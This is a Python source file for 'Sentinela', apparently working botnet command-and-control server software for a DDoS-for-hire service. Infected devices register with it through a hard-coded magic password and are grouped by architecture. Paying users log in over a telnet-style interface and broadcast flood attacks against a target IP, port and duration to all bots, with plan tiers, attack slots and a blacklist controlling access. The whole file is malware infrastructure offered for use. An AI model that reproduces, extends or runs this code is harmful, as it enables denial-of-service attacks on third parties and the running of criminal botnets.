import threading, socket, json, time, logging, os
from datetime import datetime
from colorama import Fore, init
import ipaddress

log_dir = os.path.join(os.path.dirname(os.path.dirname(__file__)), 'logs')
os.makedirs(log_dir, exist_ok=True)

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s [%(levelname)s] %(message)s',
    handlers=[
        logging.FileHandler(os.path.join(log_dir, f'sentinela_{datetime.now().strftime("%Y%m%d")}.log')),
        logging.StreamHandler()
    ]
)

from src.config.config import configs
from src.database.database import login, get_user, update_user_attack_count, is_method_allowed
from src.methods.methods import botnetMethodsName, isBotnetMethod
from src.blacklist.blacklist import load_blacklist, is_blacklisted, add_to_blacklist, remove_from_blacklist
from src.plans.plans import format_plan_info
from src.commands.commands import handle_admin_commands

class SentinelaServer:
    def __init__(self):
        logging.info("Inicializando servidor Sentinela")
        self.config = configs()
        self.global_limits = self.config.get("global_limits", {})
        server_config = self.config.get("server", {})
        self.c2_name = server_config.get("name", "SentinelaC2")
        self.host = server_config.get("host", "0.0.0.0")
        self.port = int(server_config.get("port", 1337))
        
        self.clients = {}
        self.attacks = {}
        self.bots = {} 
        
        self.bots_by_arch = {
            "i386": [], "mips": [], "mips64": [], "x86_64": [],
            "armv7l": [], "armv8l": [], "aarch64": [], "ppc64le": [],
            "unknown": [],
        }
        
        self.ansi_clear = '\033[2J\033[H'
        
        self.banner = f'''
                    .▄▄ · ▄▄▄ . ▐ ▄ ▄▄▄▄▄▪   ▐ ▄ ▄▄▄ .▄▄▌   ▄▄▄· 
                    ▐█ ▀. ▀▄.▀·•█▌▐█•██  ██ •█▌▐█▀▄.▀·██•  ▐█ ▀█ 
                    ▄▀▀▀█▄▐▀▀▪▄▐█▐▐▌ ▐█.▪▐█·▐█▐▐▌▐▀▀▪▄██▪  ▄█▀▀█ 
                    ▐█▄▪▐█▐█▄▄▌██▐█▌ ▐█▌·▐█▌██▐█▌▐█▄▄▌▐█▌▐▌▐█ ▪▐▌
                     ▀▀▀▀  ▀▀▀ ▀▀ █▪ ▀▀▀ ▀▀▀▀▀ █▪ ▀▀▀ .▀▀▀  ▀  ▀ 
                 Sentinela by Cirqueira  |  Type 'help' for commands
                 
'''

        self.banner = self.colorize_text_gradient(self.banner)
        
        init(convert=True)
        self.colors = {
            "G": '\033[1;32m',  # Green
            "C": '\033[1;37m',  # White
            "Y": '\033[1;33m',  # Yellow
            "B": '\033[1;34m',  # Blue
            "R": '\033[1;31m',  # Red
            "Q": '\033[1;36m',  # Cian
            "GRAY": '\033[90m',  # Gray
            "RESET": '\033[0m',  # Reset
        }
    
    def colorize_text_gradient(self, banner):
        start_color = (0, 255, 0)
        end_color   = (255, 255, 0)

        num_letters = len(banner)
        step_r = (end_color[0] - start_color[0]) / num_letters
        step_g = (end_color[1] - start_color[1]) / num_letters
        step_b = (end_color[2] - start_color[2]) / num_letters

        reset_color = "\033[0m"

        current_color = start_color
        colored_banner = ""

        for i, letter in enumerate(banner):
            color_code = f"\033[38;2;{int(current_color[0])};{int(current_color[1])};{int(current_color[2])}m"
            colored_banner += f"{color_code}{letter}{reset_color}"
            current_color = (current_color[0] + step_r, current_color[1] + step_g, current_color[2] + step_b)

        return colored_banner

    def start(self):
        logging.info(f"Iniciando servidor {self.c2_name} em {self.host}:{self.port}")
        
        if int(self.port) < 1 or int(self.port) > 65535:
            logging.error("Porta inválida")
            return False
        
        self.sock = socket.socket()
        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        
        try:
            self.sock.bind((self.host, self.port))
        except Exception as e:
            logging.error(f"Erro ao abrir porta: {e}")
            return False
            
        self.sock.listen()
        
        threading.Thread(target=self.ping_bots, daemon=True).start()
        
        logging.info(f"Servidor {self.c2_name} online!")
        print(f"\n[+] {self.c2_name} está online em {self.host}:{self.port}!\n")
        
        while True:
            try:
                client, address = self.sock.accept()
                threading.Thread(target=self.handle_client, args=(client, address)).start()
            except Exception as e:
                logging.error(f"Erro ao aceitar conexão: {e}")
                
        return True
    
    def send(self, socket, data, escape=True, reset=True):
        if reset:
            data += self.colors["RESET"]
        if escape:
            data += '\r\n'
        try:
            socket.send(data.encode())
        except:
            pass
    
    def handle_client(self, client, address):
        try:
            self.send(client, f'\33]0;{self.c2_name} | Login\a', False)
            
            while True:
                self.send(client, self.ansi_clear, False)
                self.send(client, f'{Fore.LIGHTBLUE_EX}Username{Fore.LIGHTWHITE_EX}: ', False)
                username = client.recv(1024).decode().strip()
                if username:
                    break
            
            password = ''
            while 1:
                self.send(client, f'{Fore.LIGHTBLUE_EX}Password{Fore.LIGHTWHITE_EX}:{Fore.BLACK} ', False, False)
                while not password.strip():
                    password = client.recv(1024).decode('cp1252').strip()
                break
            
            if password == '\xff\xff\xff\xff\75':
                self.register_bot(client, address, username)
                return
            
            self.send(client, self.ansi_clear, False)
            
            if not login(username, password):
                self.send(client, Fore.RED + 'Credenciais inválidas')
                logging.warning(f"Tentativa de login falhou: {username} de {address[0]}")
                time.sleep(1)
                client.close()
                return
                
            logging.info(f"Usuário logado: {username} de {address[0]}")
            self.clients[client] = address
            
            threading.Thread(target=self.update_title, args=(client, username), daemon=True).start()
            threading.Thread(target=self.command_line, args=(client, username), daemon=True).start()
            
        except Exception as e:
            logging.error(f"Erro ao processar cliente: {e}")
            client.close()
    
    def register_bot(self, client, address, arch):
        if arch not in self.bots_by_arch:
            arch = 'unknown'
            
        for bot_addr in self.bots.values():
            if bot_addr[0] == address[0]:
                client.close()
                return
                
        self.bots[client] = address
        self.bots_by_arch[arch].append((client, address))
        logging.info(f"Bot conectado: {address[0]} ({arch})")
    
    def remove_bot(self, client):
        if client in self.bots:
            address = self.bots[client][0]
            arch_found = False
            
            for arch in self.bots_by_arch:
                for i, (bot_client, bot_addr) in enumerate(self.bots_by_arch[arch]):
                    if bot_client == client:
                        self.bots_by_arch[arch].pop(i)
                        arch_found = True
                        break
                if arch_found:
                    break

            self.bots.pop(client)
            logging.info(f"Bot desconectado: {address}")
    
    def ping_bots(self):
        while True:
            dead_bots = []
            for bot in list(self.bots.keys()):
                try:
                    bot.settimeout(5)
                    self.send(bot, 'PING', False, False)
                    if bot.recv(1024).decode() != 'PONG':
                        dead_bots.append(bot)
                except Exception:
                    dead_bots.append(bot)
                
            for bot in dead_bots:
                try:
                    bot.close()
                except:
                    pass
                self.remove_bot(bot)
                
            time.sleep(4)
    
    def update_title(self, client, username):
        try:
            user_data = get_user(username)
            max_attacks = self.global_limits.get("max_attacks")
            
            while True:
                title = f"\33]0;{self.c2_name} | "
                title += f"Username: {username} | "
                title += f"Plan: {user_data.get('plan')} | "
                title += f"Expires: {user_data.get('expires_at')} | "
                title += f"Users: {len(self.clients)} | "
                title += f"Bots: {len(self.bots)} | "
                title += f"Running: {len(self.attacks)}/{max_attacks}\a"
                
                self.send(client, title, False)
                time.sleep(0.6)
        except Exception:
            client.close()
    
    def broadcast(self, data, username):
        dead_bots = []
        threads = self.global_limits.get("threads")
        
        for bot in self.bots.keys():
            try:
                if len(data) > 5:
                    self.send(bot, f'{data} {threads} {username}', False, False)
                else:
                    self.send(bot, f'{data} {username}', False, False)
            except:
                dead_bots.append(bot)
                
        # Remover bots mortos
        for bot in dead_bots:
            try:
                bot.close()
            except:
                pass
            self.remove_bot(bot)
    
    def list_arch_counts(self, client):
        if not self.bots:
            self.send(client, f'{Fore.LIGHTWHITE_EX}\nNo bots :C\n')
            return
            
        self.send(client, f'{Fore.WHITE}Connected bots: {Fore.GREEN}{len(self.bots)}')
        self.send(client, f'\n{Fore.WHITE}Bots Architectures:')
        
        for arch, bot_list in self.bots_by_arch.items():
            if len(bot_list) > 0:
                self.send(client, f"     {Fore.WHITE}{arch}: {Fore.GREEN}{len(bot_list)}")
                
        self.send(client, '')
    
    def validate_ip(self, ip):
        try:
            parts = ip.split('.')
            if len(parts) != 4 or not all(x.isdigit() for x in parts):
                return False
                
            ip_obj = ipaddress.ip_address(ip)
            if ip_obj.is_private or ip_obj.is_loopback or ip_obj.is_multicast:
                return False
                
            return True
        except:
            return False
    
    def validate_port(self, port, rand=False):
        if not port.isdigit():
            return False
            
        port_num = int(port)
        if rand:
            return 0 <= port_num <= 65535
        else:
            return 1 <= port_num <= 65535
    
    def validate_time(self, time):
        if not time.isdigit():
            return False
            
        time_num = int(time)
        max_time = self.global_limits.get("max_time", 1300)
        min_time = self.global_limits.get("min_time", 10)
        return min_time <= time_num <= max_time
    
    def can_launch_attack(self, ip, port, secs, username, client):
        max_attacks = self.global_limits.get("max_attacks", 100)

        if is_blacklisted(ip):
            self.send(client, f'{Fore.RED}Target is blacklisted!\n')
            return False
            
        if not self.validate_ip(ip):
            self.send(client, f'{Fore.RED}Invalid IP address\n')
            return False
            
        if not self.validate_port(port):
            self.send(client, f'{Fore.RED}Invalid port number (1-65535)\n')
            return False
            
        if not self.validate_time(secs):
            min_time = self.global_limits.get("min_time", 10)
            max_time = self.global_limits.get("max_time", 1300)
            self.send(client, f'{Fore.RED}Invalid attack duration ({min_time}-{max_time} seconds)\n')
            return False
        
        if len(self.attacks) >= max_attacks:
            self.send(client, f'{Fore.RED}No slots available!\n')
            return False
            
        if username in self.attacks:
            self.send(client, f'{Fore.RED}Attack already sent!\n')
            return False
            
        for user, info in self.attacks.items():
            if info['target'] == ip:
                self.send(client, f'{Fore.RED}Target is already under flood, don\'t abuse it!\n')
                return False
                
        return True
    
    def remove_attack(self, username, timeout):
        time.sleep(timeout)
        if username in self.attacks:
            logging.info(f"Ataque de {username} finalizado (timeout)")
            del self.attacks[username]
    
    def return_banner(self, client, username, user_data):
        self.send(
            client,
            f" Username: {username} | "
            f"Plan: {user_data.get('plan')} | "
            f"Role: {user_data.get('role')} | "
            f"Expires in: {user_data.get('days_remaining')} days | "
            f"Bots: {len(self.bots)}"
        )
        for line in self.banner.split('\n'):
            self.send(client, line)
        return

    def command_line(self, client, username):
        gray = Fore.LIGHTBLACK_EX
        white = Fore.LIGHTWHITE_EX
        green = Fore.LIGHTGREEN_EX
        red = Fore.LIGHTRED_EX
        yellow = Fore.LIGHTYELLOW_EX
        blue = Fore.LIGHTBLUE_EX
        user_data = get_user(username)
        
        self.return_banner(client, username, user_data)
        
        # Prompt do usuário
        prompt = f'{blue}{self.colorize_text_gradient(self.c2_name)} {white}> '
        self.send(client, prompt, False)
        
        try:
            while True:
                data = client.recv(1024).decode().strip()
                if not data:
                    continue
                    
                args = data.split(' ')
                command = args[0].upper()
                
                self.send(client, self.ansi_clear, False)
                for line in self.banner.split('\n'):
                    self.send(client, line)
                
                if command.startswith('!'):
                    handle_admin_commands(command, args, client, self.send, username)
                    self.send(client, prompt, False)
                    continue
                
                if command in ['HELP', '?', 'COMMANDS']:
                    self.send(client, self.colorize_text_gradient('Commands:           Description:'))
                    self.send(client, f'{white}HELP{gray}                Shows list of commands')
                    self.send(client, f'{white}BOTNET{gray}              Shows list of botnet attack methods')
                    self.send(client, f'{white}BOTS{gray}                Shows all conected bots')
                    self.send(client, f'{white}STOP{gray}                Stop all your floods in progress')
                    self.send(client, f'{white}CLEAR{gray}               Clears the screen')
                    self.send(client, f'{white}OWNER{gray}               Shows owner information')
                    self.send(client, f'{white}LOGOUT{gray}              Disconnects from C&C server\n')
                    
                elif command == 'BOTNET':
                    botnetMethods = botnetMethodsName('ALL')
                    self.send(client, self.colorize_text_gradient('Botnet Methods:'))
                    
                    user_data = get_user(username)
                    user_plan = user_data.get('plan', 'basic') if user_data else 'basic'
                    
                    for method, desc in botnetMethods.items():
                        method_name = method[1:] if method.startswith('.') else method
                        
                        method_available = is_method_allowed(username, method_name)
                        
                        if method_available:
                            self.send(client, f"{white}{method} {yellow}{desc}")
                        else:
                            self.send(client, f"{white}{method} {yellow}{desc} {red}[Upgrade Required]")
                    
                    self.send(client, '')
                    
                elif command in ['BOTS', 'ZOMBIES']:
                    self.send(client, self.ansi_clear, False)
                    for line in self.banner.split('\n'):
                        self.send(client, line)
                    self.list_arch_counts(client)
                    
                elif command == 'STOP':
                    if username in self.attacks:
                        del self.attacks[username]
                        self.broadcast(data, username)
                        self.send(client, f'\n{gray}> {white}Your flooding has been successfully stopped.\n')
                        logging.info(f"Ataque de {username} parado manualmente")
                    else:
                        self.send(client, f'\n{gray}> {white}You have no floods in progress.\n')
                        
                elif command in ['OWNER', 'CREDITS']:
                    self.send(client, f'\n{blue}Instagram{gray}: {self.colors["Q"]}cirqueirax')
                    self.send(client, f'{blue}Telegram{gray}: {self.colors["Q"]}Cirqueiraz')
                    self.send(client, f'{blue}Discord{gray}: {self.colors["Q"]}cirqueira')
                    self.send(client, f'{blue}GitHub{gray}: {self.colors["Q"]}CirqueiraDev\n')
                    
                elif command in ['CLEAR', 'CLS']:
                    self.send(client, self.ansi_clear, False)
                    self.return_banner(client, username, user_data)
                        
                elif command in ['LOGOUT', 'QUIT', 'EXIT', 'BYE']:
                    self.send(client, f'\n{blue}America ya!\n')
                    time.sleep(1)
                    break
                    
                elif isBotnetMethod(command):
                    method_name = command[1:] if command.startswith('.') else command
                    if not is_method_allowed(username, method_name):
                        self.send(client, f'{red}This method is not available in your plan. Upgrade to use it.\n')
                        self.send(client, prompt, False)
                        continue
                    
                    if len(args) == 4:
                        ip = args[1]
                        port = args[2]
                        secs = args[3]
                        
                        if self.can_launch_attack(ip, port, secs, username, client):
                            attack_info = f'''
{gray}> {white}Method   {gray}: {yellow}{botnetMethodsName(command).strip()}{gray}
{gray}> {white}Target   {gray}: {white}{ip}{gray}
{gray}> {white}Port     {gray}: {white}{port}{gray}
{gray}> {white}Duration {gray}: {white}{secs}{gray}
                            '''
                            for line in attack_info.split('\n'):
                                self.send(client, line)
                                
                            self.broadcast(data, username)
                            self.send(client, f'{green} Attack sent to {len(self.bots)} bots\n')
                            
                            self.attacks[username] = {'target': ip, 'duration': secs, 'method': command}
                            threading.Thread(target=self.remove_attack, args=(username, int(secs))).start()
                            
                            update_user_attack_count(username)
                            
                            logging.info(f"Ataque iniciado: {username} => {ip}:{port} ({command}) por {secs}s")
                    else:
                        self.send(client, f'Usage: {gray}{command} [IP] [PORT] [TIME]\n')
                else:
                    self.send(client, f'{red}{command} not found!\n')
                
                self.send(client, prompt, False)
                
        except Exception as e:
            logging.error(f"Erro na linha de comando: {e}")
        finally:
            client.close()
            if client in self.clients:
                del self.clients[client]
            logging.info(f"Cliente desconectado: {username}")

def main():
    server = SentinelaServer()
    server.start()

if __name__ == '__main__':
    main()
